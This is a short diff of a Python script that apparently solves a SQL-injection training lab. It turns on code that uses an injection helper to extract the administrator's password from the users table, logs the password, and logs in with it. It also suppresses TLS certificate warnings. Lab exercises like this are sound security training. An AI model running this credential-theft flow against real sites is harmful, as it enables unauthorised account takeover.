@@ -18,7 +18,7 @@ logging.basicConfig(
 )
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-SLEEP = 10
+SLEEP = 5
 class MySQLi(SQLi):
     def __init__(self, tracking_id, session_token):
         super().__init__()
@@ -66,20 +66,14 @@ def main(args):
     log.info(f"TrackingId: {tracking_id}")
     sqli = MySQLi(tracking_id, session_token)
     print(sqli.get_response_string("SELECT 'aaaa'", shop.base_url, shop.no_proxy, 1))
-   
-   
-   
-   
-   
-   #password = sqli.get_response_string(
-   #    "SELECT password from users where username = 'administrator'",
-   #    shop.base_url,
-   #    shop.no_proxy,
-   #    10,
-   #)
-   #log.info(f"Received password: {password}")
-   #shop.login("administrator", password)
-   #shop.is_solved()
+    password = sqli.get_response_string(
+       "SELECT password from users where username = 'administrator'", 
+       shop.base_url,shop.no_proxy,1
+       )
+    log.info(f"Received password: {password}")
+    shop.login("administrator", password)
+    shop.is_solved()
+    
     
 if __name__ == "__main__":
     args = utils.parse_args(sys.argv)
